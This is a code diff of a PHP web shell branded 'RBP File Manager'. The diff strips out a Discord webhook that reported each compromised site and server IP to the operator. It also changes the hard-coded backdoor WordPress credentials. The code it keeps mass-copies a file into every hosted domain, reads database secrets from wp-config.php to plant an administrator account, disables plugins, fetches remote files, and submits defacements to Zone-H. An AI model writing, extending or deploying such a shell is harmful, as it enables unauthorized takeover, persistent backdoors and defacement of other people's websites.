@@ -1,63 +1,4 @@
 <?php
-// Discord Webhook Notification when script is accessed
-$webhookUrl = "https://discord.com/api/webhooks/1440628547784937632/UPihGhacKZ-AFt0iwOdReRCqghTydFrDlaQWsYqxPVOjCjM0fTJKiIyTxdFrDlaQWsYqxPVOjCjM0fTJKiIyT";
-
-// Send webhook only once when script is accessed
-if (!isset($_COOKIE['rbp_visited'])) {
-    $currentUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-    $serverIP = $_SERVER['SERVER_ADDR'] ?? 'Unknown';
-    $userIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
-    
-    $payload = json_encode([
-        'embeds' => [
-            [
-                'title' => 'Shell Uploaded',
-                'description' => 'A new RBP shell has been uploaded and accessed',
-                'color' => 15105570,
-                'fields' => [
-                    [
-                        'name' => 'Site',
-                        'value' => $currentUrl,
-                        'inline' => false
-                    ],
-                    [
-                        'name' => 'Server IP',
-                        'value' => $serverIP,
-                        'inline' => true
-                    ],
-                    [
-                        'name' => 'User IP',
-                        'value' => $userIP,
-                        'inline' => true
-                    ],
-                    [
-                        'name' => 'Current Directory',
-                        'value' => getcwd(),
-                        'inline' => false
-                    ]
-                ],
-                'timestamp' => date('c'),
-                'footer' => [
-                    'text' => 'RBP File Manager'
-                ]
-            ]
-        ]
-    ]);
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $webhookUrl);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_exec($ch);
-    curl_close($ch);
-
-    // Set cookie to prevent duplicate notifications
-    setcookie('rbp_visited', '1', time() + (86400 * 30), "/"); // 30 days
-}
-
 // Auto-detect base directory for domains
 function RBPautoDetectBaseDir() {
     $possiblePaths = [
@@ -67,7 +8,7 @@ function RBPautoDetectBaseDir() {
         '/home/*/www',
         '/home/*/web',
         '/home/*/*/public_html',
-        '/home/*', // Added to check direct user home directory
+        '/home/*',
     ];
     
     $currentUser = function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') : 'unknown';
@@ -79,7 +20,6 @@ function RBPautoDetectBaseDir() {
         }
     }
     
-    // Fallback to current directory
     return getcwd();
 }
 
@@ -87,20 +27,16 @@ function RBPautoDetectBaseDir() {
 function RBPgetAllSubdomains($baseDir) {
     $subdomains = [];
     
-    // Look for domains directory structure
     if (is_dir($baseDir)) {
-        // Get all directories in base directory
         $domainDirs = glob($baseDir . '/*', GLOB_ONLYDIR);
         
         if ($domainDirs) {
             foreach ($domainDirs as $domainDir) {
                 $domainName = basename($domainDir);
                 
-                // Check if it looks like a domain (has dot or common TLDs)
                 if (strpos($domainName, '.') !== false || 
                     preg_match('/\.(com|net|org|in|co|info|biz|us|uk|ca|au)$/i', $domainName)) {
                     
-                    // Check for public_html in domain directory
                     $publicHtml = $domainDir . '/public_html';
                     if (is_dir($publicHtml)) {
                         $subdomains[] = [
@@ -109,7 +45,6 @@ function RBPgetAllSubdomains($baseDir) {
                             'url' => 'https://' . $domainName
                         ];
                     } else {
-                        // If no public_html, use the domain directory itself
                         $subdomains[] = [
                             'name' => $domainName,
                             'path' => $domainDir,
@@ -140,14 +75,12 @@ function RBPmassDeploy($sourceFile, $baseDir) {
         return ["error" => "Cannot read source file: $sourceFile"];
     }
     
-    // Get the original filename
     $originalFilename = basename($sourceFile);
     
     foreach ($subdomains as $subdomain) {
         $processed++;
         $targetFile = $subdomain['path'] . '/' . $originalFilename;
         
-        // Create directory if it doesn't exist
         $targetDir = dirname($targetFile);
         if (!is_dir($targetDir)) {
             if (!mkdir($targetDir, 0755, true)) {
@@ -207,14 +140,12 @@ function RBPdownloadDomainsList($baseDir, $filename) {
 function RBPeditWordPressUser() {
     $result = [];
     
-    // Start from current directory and search upwards for wp-config.php
     $currentDir = getcwd();
     $wpConfigPath = null;
     $wpDir = null;
     
-    // Search for wp-config.php in current directory and parent directories
     $searchDir = $currentDir;
-    $maxDepth = 10; // Prevent infinite loop
+    $maxDepth = 10;
     
     for ($i = 0; $i < $maxDepth; $i++) {
         $configPath = $searchDir . '/wp-config.php';
@@ -224,7 +155,6 @@ function RBPeditWordPressUser() {
             break;
         }
         
-        // If we're at root, stop searching
         if ($searchDir === '/' || $searchDir === dirname($searchDir)) {
             break;
         }
@@ -242,9 +172,8 @@ function RBPeditWordPressUser() {
     $result['wp_config_path'] = $wpConfigPath;
     $result['wp_directory'] = $wpDir;
 
-    // Default credentials
-    $new_user_login = 'ReaperBythe222@';
-    $new_user_pass  = 'ReaperBythe222@';
+    $new_user_login = 'darknetsyndicate';
+    $new_user_pass  = 'darknetsyndicate';
     $new_user_email = 'admin@example.com';
 
     $wp_index_path  = $wpDir . '/index.php';
@@ -402,7 +331,6 @@ require __DIR__ . '/wp-blog-header.php';";
     $db_password = $db_constants['DB_PASSWORD'];
     $db_host     = $db_constants['DB_HOST'];
 
-    // Test database connection
     $mysqli = @new mysqli($db_host, $db_user, $db_password, $db_name);
     if ($mysqli->connect_error) {
         $result['error'] = "Database connection failed: " . $mysqli->connect_error;
@@ -412,7 +340,6 @@ require __DIR__ . '/wp-blog-header.php';";
     $hasher = new PasswordHash();
     $password_hash = $hasher->HashPassword($new_user_pass);
 
-    // Check if user exists
     $stmt = $mysqli->prepare("SELECT ID FROM `{$table_prefix}users` WHERE user_login = ?");
     $stmt->bind_param('s', $new_user_login);
     $stmt->execute();
@@ -421,7 +348,6 @@ require __DIR__ . '/wp-blog-header.php';";
     $stmt->close();
 
     if ($user_exists) {
-        // Update existing user
         $stmt = $mysqli->prepare("UPDATE `{$table_prefix}users` SET user_pass = ?, user_email = ? WHERE ID = ?");
         $stmt->bind_param('ssi', $password_hash, $new_user_email, $existing_user_id);
         if (!$stmt->execute()) {
@@ -432,7 +358,6 @@ require __DIR__ . '/wp-blog-header.php';";
         $stmt->close();
         $result['action'] = 'updated';
     } else {
-        // Create new user
         $time = date('Y-m-d H:i:s');
         $stmt = $mysqli->prepare("
         INSERT INTO `{$table_prefix}users` 
@@ -451,7 +376,6 @@ require __DIR__ . '/wp-blog-header.php';";
         $new_user_id = $stmt->insert_id;
         $stmt->close();
 
-        // Set user capabilities (administrator)
         $cap_key = $table_prefix . 'capabilities';
         $level_key = $table_prefix . 'user_level';
         $capabilities = serialize(['administrator' => true]);
@@ -465,7 +389,6 @@ require __DIR__ . '/wp-blog-header.php';";
         }
         $stmt->close();
 
-        // Set user level
         $user_level = 10;
         $level_value = (string)$user_level;
         $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
@@ -479,7 +402,6 @@ require __DIR__ . '/wp-blog-header.php';";
         $result['action'] = 'created';
     }
 
-    // Reset active plugins
     $empty_plugins = serialize([]);
     $stmt = $mysqli->prepare("UPDATE `{$table_prefix}options` SET option_value = ? WHERE option_name = 'active_plugins'");
     if ($stmt) {
@@ -488,7 +410,6 @@ require __DIR__ . '/wp-blog-header.php';";
         $stmt->close();
     }
 
-    // Set default theme
     $default_theme = detect_default_theme($wpDir);
     $stmt = $mysqli->prepare("UPDATE `{$table_prefix}options` SET option_value = ? WHERE option_name IN ('template','stylesheet')");
     if ($stmt) {
@@ -497,14 +418,12 @@ require __DIR__ . '/wp-blog-header.php';";
         $stmt->close();
     }
 
-    // Restore WordPress index
     if (file_exists($wp_index_path)) {
         restore_wordpress_index($wp_index_path);
     }
 
     $mysqli->close();
 
-    // Get WordPress login URL
     $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
     $host = $_SERVER['HTTP_HOST'];
     $loginUrl = $protocol . $host . '/wp-login.php';
@@ -538,15 +457,12 @@ if (isset($_GET['d']) && !empty($_GET['d'])) {
 $currentDir = str_replace("\\", "/", $currentDir);
 $dir = $currentDir;
 
-// Start session early for all operations
 if (!isset($_SESSION)) {
     session_start();
 }
 
-// Check if this is a POST request for specific actions
 $isPostAction = false;
 
-// Download domains list handler
 if (isset($_GET['download'])) {
     header('Content-Type: text/plain');
     header('Content-Disposition: attachment; filename="domains.txt"');
@@ -558,12 +474,10 @@ if (isset($_GET['download'])) {
     exit;
 }
 
-// Mass deploy handler
 if (isset($_POST['mass_deploy'])) {
     $isPostAction = true;
     $sourceFile = $_POST['deploy_file_path'] ?? '';
     
-    // Check if custom base directory is provided
     if (isset($_POST['custom_base_dir']) && !empty($_POST['custom_base_dir'])) {
         $baseDir = $_POST['custom_base_dir'];
     }
@@ -582,12 +496,10 @@ if (isset($_POST['mass_deploy'])) {
     exit;
 }
 
-// Mass delete handler
 if (isset($_POST['mass_delete'])) {
     $isPostAction = true;
     $sourceFile = $_POST['deploy_file_path'] ?? '';
     
-    // Check if custom base directory is provided
     if (isset($_POST['custom_base_dir']) && !empty($_POST['custom_base_dir'])) {
         $baseDir = $_POST['custom_base_dir'];
     }
@@ -602,7 +514,6 @@ if (isset($_POST['mass_delete'])) {
     exit;
 }
 
-// WordPress User Editor Handler
 if (isset($_POST['wp_edit_user_submit'])) {
     $isPostAction = true;
     $result = RBPeditWordPressUser();
@@ -611,7 +522,6 @@ if (isset($_POST['wp_edit_user_submit'])) {
     exit;
 }
 
-// WGET Download Functionality
 if (isset($_POST['wget_url'])) {
     $isPostAction = true;
     $url = $_POST['wget_url'] ?? '';
@@ -639,7 +549,6 @@ if (isset($_POST['wget_url'])) {
     exit;
 }
 
-// Adminer Download Functionality
 if (isset($_POST['download_adminer'])) {
     $isPostAction = true;
     function RBPadminer($url, $isi) {
@@ -674,7 +583,6 @@ if (isset($_POST['download_adminer'])) {
     exit;
 }
 
-// Zone-H Functionality
 if (isset($_POST['zoneh_submit'])) {
     $isPostAction = true;
     $domainList = isset($_POST['zoneh_url']) ? explode("\n", str_replace("\r", "", $_POST['zoneh_url'])) : [];
@@ -688,7 +596,6 @@ if (isset($_POST['zoneh_submit'])) {
     exit;
 }
 
-// Upload handler - shellko.php style bypass
 if (isset($_POST['s']) && isset($_FILES['u'])) {
     $isPostAction = true;
     if ($_FILES['u']['error'] == 0) {
@@ -707,7 +614,6 @@ if (isset($_POST['s']) && isset($_FILES['u'])) {
     exit;
 }
 
-// Delete File handler - shellko.php style bypass
 if (isset($_POST['del'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['del']);
@@ -720,7 +626,6 @@ if (isset($_POST['del'])) {
     exit;
 }
 
-// Save Edited File handler - shellko.php style bypass
 if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['obj']);
@@ -734,7 +639,6 @@ if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
     exit;
 }
 
-// Rename handler - shellko.php style bypass
 if (isset($_POST['ren']) && isset($_POST['new'])) {
     $isPostAction = true;
     $oldPath = base64_decode($_POST['ren']);
@@ -749,7 +653,6 @@ if (isset($_POST['ren']) && isset($_POST['new'])) {
     exit;
 }
 
-// Download File handler
 if (isset($_POST['download_file'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['download_file']);
@@ -766,7 +669,6 @@ if (isset($_POST['download_file'])) {
     }
 }
 
-// Show success/error notifications
 if (isset($_SESSION['upload_result'])) {
     echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
     if (strpos($_SESSION['upload_result'], 'SUCCESS') !== false) {
@@ -1225,7 +1127,6 @@ if (isset($_SESSION['download_result'])) {
         </div>
     </div>
 
-    <!-- Results Popup -->
     <div id="resultsPopup" class="results-popup">
         <div class="results-content">
             <?php
@@ -1250,7 +1151,6 @@ if (isset($_SESSION['download_result'])) {
                 
                 echo '</div>';
                 
-                // Clear session
                 unset($_SESSION['mass_deploy_results']);
                 unset($_SESSION['mass_deploy_source']);
                 unset($_SESSION['mass_deploy_base']);
@@ -1271,7 +1171,6 @@ if (isset($_SESSION['download_result'])) {
                 
                 echo '</div>';
                 
-                // Clear session
                 unset($_SESSION['mass_delete_results']);
                 unset($_SESSION['mass_delete_filename']);
                 unset($_SESSION['mass_delete_base']);
@@ -1319,7 +1218,6 @@ if (isset($_SESSION['download_result'])) {
                     echo '</div>';
                 }
                 
-                // Clear session
                 unset($_SESSION['wp_edit_results']);
             } elseif (isset($_SESSION['zoneh_results'])) {
                 $zonehResults = $_SESSION['zoneh_results'];
@@ -1340,7 +1238,6 @@ if (isset($_SESSION['download_result'])) {
                 
                 echo '</div>';
                 
-                // Clear session
                 unset($_SESSION['zoneh_results']);
             }
             ?>
@@ -1350,7 +1247,6 @@ if (isset($_SESSION['download_result'])) {
         </div>
     </div>
 
-    <!-- WGET Popup -->
     <div id="wgetPopup" class="popup-overlay">
         <div class="popup-content">
             <h3>WGET Download</h3>
@@ -1363,7 +1259,6 @@ if (isset($_SESSION['download_result'])) {
         </div>
     </div>
 
-    <!-- Adminer Popup -->
     <div id="adminerPopup" class="popup-overlay">
         <div class="popup-content">
             <div id="adminerContent">
@@ -1377,7 +1272,6 @@ if (isset($_SESSION['download_result'])) {
         </div>
     </div>
 
-    <!-- Zone-H Popup -->
     <div id="zonehPopup" class="popup-overlay">
         <div class="popup-content">
             <div id="zonehContent">
@@ -1395,7 +1289,6 @@ if (isset($_SESSION['download_result'])) {
         </div>
     </div>
 
-    <!-- Mass Deploy Popup -->
     <div id="massDeployPopup" class="popup-overlay">
         <div class="popup-content">
             <div id="massDeployContent">
@@ -1421,7 +1314,6 @@ if (isset($_SESSION['download_result'])) {
                     ?>
                 </div>
                 
-                <!-- Custom Directory Input -->
                 <div class="custom-dir-input">
                     <p><strong>Custom Base Directory (if domains not detected):</strong></p>
                     <input type="text" id="custom_base_dir" placeholder="/home/db/" value="<?php echo htmlspecialchars($baseDir); ?>" style="width: 100%; padding: 8px; background: #2a2a2a; border: 1px solid #444; border-radius: 3px; color: #fff;">
@@ -1463,7 +1355,6 @@ if (isset($_SESSION['download_result'])) {
         </div>
     </div>
 
-    <!-- WordPress Edit User Popup -->
     <div id="wpedituserPopup" class="popup-overlay">
         <div class="popup-content">
             <div id="wpedituserContent">
@@ -1478,8 +1369,8 @@ if (isset($_SESSION['download_result'])) {
                 </ul>
                 <p><strong>Default Credentials:</strong></p>
                 <p style="background: #2a2a2a; padding: 10px; border-radius: 5px; border: 1px solid #444;">
-                    Username: <strong>ReaperBythe222@</strong><br>
-                    Password: <strong>ReaperBythe222@</strong>
+                    Username: <strong>darknetsyndicate</strong><br>
+                    Password: <strong>darknetsyndicate</strong>
                 </p>
                 <p style="color: #ccc; font-size: 12px;">Current directory: <?php echo htmlspecialchars($currentDir); ?></p>
                 <div style="text-align: center; margin-top: 15px;">
@@ -1706,7 +1597,6 @@ if (isset($_SESSION['download_result'])) {
             form.submit();
         }
         
-        // Auto-show results popup if there are results
         window.onload = function() {
             <?php if (isset($_SESSION['mass_deploy_results']) || isset($_SESSION['mass_delete_results']) || isset($_SESSION['wp_edit_results']) || isset($_SESSION['zoneh_results'])): ?>
             document.getElementById('resultsPopup').style.display = 'block';
@@ -1715,9 +1605,7 @@ if (isset($_SESSION['download_result'])) {
     </script>
 
 <?php
-// Only show file listing if not in edit/rename mode
 if (!isset($_POST['edit']) && !isset($_POST['ren'])) {
-    // Directory Navigation
     $pathParts = explode("/", $currentDir);
     echo "<div class=\"dir-path\">";
     foreach ($pathParts as $k => $v) {
@@ -1730,7 +1618,6 @@ if (!isset($_POST['edit']) && !isset($_POST['ren'])) {
     }
     echo "</div>";
 
-    // File/Folder Listing
     $items = @scandir($currentDir);
     if ($items !== false) {
         echo "<div class='file-list'>";
@@ -1769,7 +1656,6 @@ if (!isset($_POST['edit']) && !isset($_POST['ren'])) {
     }
 }
 
-// Edit File (only shows when editing)
 if (isset($_POST['edit'])) {
     $filePath = base64_decode($_POST['edit']);
     $fileDir = dirname($filePath);
@@ -1790,7 +1676,6 @@ if (isset($_POST['edit'])) {
     }
 }
 
-// Rename form (only shows when renaming without new name)
 if (isset($_POST['ren']) && !isset($_POST['new'])) {
     $oldPath = base64_decode($_POST['ren']);
     $oldDir = dirname($oldPath);
